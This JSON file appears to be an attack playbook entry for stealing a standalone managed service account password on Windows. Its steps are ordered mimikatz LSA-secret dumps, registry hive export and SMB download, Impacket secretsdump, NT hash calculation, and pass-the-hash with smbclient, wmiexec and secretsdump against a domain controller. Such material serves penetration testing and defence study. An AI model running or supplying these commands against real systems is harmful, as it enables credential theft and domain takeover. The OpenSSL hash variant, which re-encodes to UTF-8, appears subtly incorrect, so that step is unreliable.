{
    "DumpSMSAPassword": {
        "meaning": "A computer with this indicates that a Standalone Managed Service Account (sMSA) is installed on it. An actor with administrative privileges on the computer can retrieve the sMSA's password by dumping LSA secrets. The password can then be used for authentication via pass-the-hash attacks.",
        "common": "",
        "windows": {
            "Direct_LSA_Dump": [
                {
                    "order": 1,
                    "command": "privilege::debug",
                    "description": "Enable debug privilege in mimikatz for memory access"
                },
                {
                    "order": 2,
                    "command": "token::elevate",
                    "description": "Elevate token to SYSTEM level for LSA access"
                },
                {
                    "order": 3,
                    "command": "lsadump::secrets",
                    "description": "Dump LSA secrets including sMSA password from live system"
                },
                {
                    "order": 4,
                    "command": "# Find _SC_{262E99C9-6160-4871-ACEC-4E61736B6F21} suffixed by sMSA name",
                    "description": "Locate sMSA password in LSA secrets output (hex-encoded)"
                }
            ],
            "Registry_Hive_Export": [
                {
                    "order": 1,
                    "command": "reg save HKLM\\SYSTEM %temp%\\SYSTEM",
                    "description": "Save SYSTEM registry hive for offline analysis"
                },
                {
                    "order": 2,
                    "command": "reg save HKLM\\SECURITY %temp%\\SECURITY",
                    "description": "Save SECURITY registry hive containing LSA secrets"
                },
                {
                    "order": 3,
                    "command": "# Transfer SYSTEM and SECURITY files to analysis machine",
                    "description": "Move registry hives to secure location for offline processing"
                },
                {
                    "order": 4,
                    "command": "lsadump::secrets /system:C:\\path\\to\\SYSTEM /security:C:\\path\\to\\SECURITY",
                    "description": "Extract sMSA password from offline registry hives using mimikatz"
                }
            ],
            "Password_Hash_Calculation": [
                {
                    "order": 1,
                    "command": "# Create nt.py: import sys, hashlib; pw_hex = sys.argv[1]; nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest(); print(nt_hash)",
                    "description": "Create Python script to calculate NT hash from hex password"
                },
                {
                    "order": 2,
                    "command": "python3 nt.py 35f3e1713d61...",
                    "description": "Calculate NT hash from hex-encoded sMSA password"
                },
                {
                    "order": 3,
                    "command": "# Use NT hash for pass-the-hash authentication as sMSA",
                    "description": "Leverage calculated hash for sMSA impersonation attacks"
                }
            ]
        },
        "linux": {
            "Registry_Analysis": [
                {
                    "order": 1,
                    "command": "smbclient //target.domain.com/c$ -U 'domain/admin%password' -c 'get windows/system32/config/system'",
                    "description": "Download SYSTEM registry hive via SMB"
                },
                {
                    "order": 2,
                    "command": "smbclient //target.domain.com/c$ -U 'domain/admin%password' -c 'get windows/system32/config/security'",
                    "description": "Download SECURITY registry hive via SMB"
                },
                {
                    "order": 3,
                    "command": "secretsdump.py -system system -security security LOCAL",
                    "description": "Extract LSA secrets including sMSA passwords using Impacket"
                }
            ],
            "Hash_Calculation": [
                {
                    "order": 1,
                    "command": "python3 -c \"import sys, hashlib; pw_hex = sys.argv[1]; print(hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest())\" 35f3e1713d61...",
                    "description": "Calculate NT hash from hex-encoded sMSA password using Python"
                },
                {
                    "order": 2,
                    "command": "echo 'HEX_PASSWORD' | xxd -r -p | iconv -f utf-16le -t utf-8 | openssl dgst -md4",
                    "description": "Alternative method to calculate NT hash using OpenSSL"
                },
                {
                    "order": 3,
                    "command": "# Store calculated hash for pass-the-hash attacks",
                    "description": "Save NT hash for subsequent authentication attempts"
                }
            ],
            "Remote_Authentication": [
                {
                    "order": 1,
                    "command": "smbclient //target.domain.com/c$ -U 'DOMAIN/sMSA$' --pw-nt-hash CALCULATED_NT_HASH",
                    "description": "Use sMSA NT hash for SMB authentication via pass-the-hash"
                },
                {
                    "order": 2,
                    "command": "wmiexec.py -hashes :CALCULATED_NT_HASH 'DOMAIN/sMSA$@target.domain.com'",
                    "description": "Execute commands using sMSA credentials via WMI"
                },
                {
                    "order": 3,
                    "command": "secretsdump.py -hashes :CALCULATED_NT_HASH 'DOMAIN/sMSA$@dc.domain.com'",
                    "description": "Use sMSA credentials for further credential dumping if privileged"
                }
            ]
        }
    }
}
